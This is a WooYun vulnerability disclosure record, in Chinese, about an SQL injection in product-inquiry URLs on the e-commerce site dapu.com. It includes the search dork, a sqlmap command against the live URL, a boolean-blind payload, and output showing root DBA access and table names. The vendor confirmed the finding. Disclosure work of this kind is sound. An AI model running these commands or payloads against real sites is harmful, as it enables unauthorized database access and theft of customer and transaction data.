{"id": 50895, "wybug_id": "wooyun-2014-076451", "wybug_title": "大扑网SQL注入,再来一发,N多核心数据", "wybug_corp": "大朴网", "wybug_author": "小饼仔", "wybug_date": "2014-09-18 15:02", "wybug_open_date": "2014-11-02 15:04", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-19：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-09-29：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-10-09：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-10-19：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-11-02：\t细节向公众公开  简要描述： 哎，之前找到两个注入点，一个M站的，速度慢，一个PC站的速度杠杠的，结果被修复了。然后晚上不甘心，想一想肯定还有什么地方有注入，结果真被我发现了，里面数据很重要吧。PS。能送点礼物吗？ 详细说明：  上次那个漏洞是萌宝征集令活动的查询注入，被和谐，不甘心，就去google了一下\nsite:dapu.com 编号\n，结果如下：\n\n随便点进去一个，发现链接很可疑\n\n有两个数字id，经验证，第一个是商品的id，第二个是咨询记录的id\n\n\n\n改成'就不出来了.果断拿到sqlmap里面去跑，有惊喜：\npython sqlmap.py -u \"http://www.dapu.com/product-askdetail-664*-18912*.html\"     sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 00:41:13custom injection marking character ('*') found in option '-u'. Do you want to process it? [Y/n/q] y[00:41:15] [INFO] resuming back-end DBMS 'mysql'[00:41:15] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: URIParameter: #1*    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: http://www.dapu.com:80/product-askdetail-664' AND 8056=8056 AND 'pkrD'='pkrD-18912.html---[00:41:16] [INFO] the back-end DBMS is MySQLback-end DBMS: MySQL 5\n   漏洞证明：  \nroot权限back-end DBMS: MySQL 5current user:    'root@%'current database:    'ecstoreprd'current user is DBA:    Trueavailable databases [6]:[*] ecstoreprd[*] information_schema[*] mysql[*] ocsprd[*] performance_schema[*] test\n\necstoreprd，219张表，里面账户、交易信息等等。还有个数据库ocsprd，也很多，这里就不贴了~[01:01:59] [INFO] fetching tables for database: 'ecstoreprd'[01:01:59] [INFO] fetching number of tables for database 'ecstoreprd'[01:01:59] [INFO] resumed: 219[01:01:59] [INFO] retrieving the length of query output[01:01:59] [INFO] resumed: 16[01:01:59] [INFO] resumed: dapu_image_image[01:01:59] [INFO] retrieving the length of query output[01:01:59] [INFO] resumed: 25[01:02:22] [INFO] retrieved: sdb_aftersale__after_sale 24/25 (96%)[01:02:39] [CRITICAL] connection timed out to the target URL or proxy. sqlmap is going to retry the request[01:02:39] [WARNING] if the problem persists please try to lower the number of used threads (option '--threads')[01:02:46] [INFO] retrieved: sdb_aftersales_after_sale[01:02:46] [INFO] retrieving the length of query output[01:02:46] [INFO] retrieved: 29[01:03:21] [INFO] retrieved: sdb_aftersales_return_product[01:03:21] [INFO] retrieving the length of query output[01:03:21] [INFO] retrieved: 13[01:03:45] [INFO] retrieved: sdb_b2c_brand[01:03:45] [INFO] retrieving the length of query output[01:03:45] [INFO] retrieved: 12[01:04:08] [INFO] retrieved: sdb_b2c_cart[01:04:08] [INFO] retrieving the length of query output[01:04:08] [INFO] retrieved: 20[01:04:34] [INFO] retrieved: sdb_b2c_cart_objects[01:04:34] [INFO] retrieving the length of query output[01:04:34] [INFO] retrieved: 27\n   修复方案：  求礼物   版权声明：转载请注明来源 小饼仔@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-09-19 17:48 厂商回复： 非常干些您的指正，要什么礼物么？ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-09-19 18:06 |    \t\t小饼仔 \t\t\t( 普通白帽子  |\t\t\t        Rank:363 漏洞数:48        | 不告诉你)\t\t \n  嘿嘿，私聊 @大朴网    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}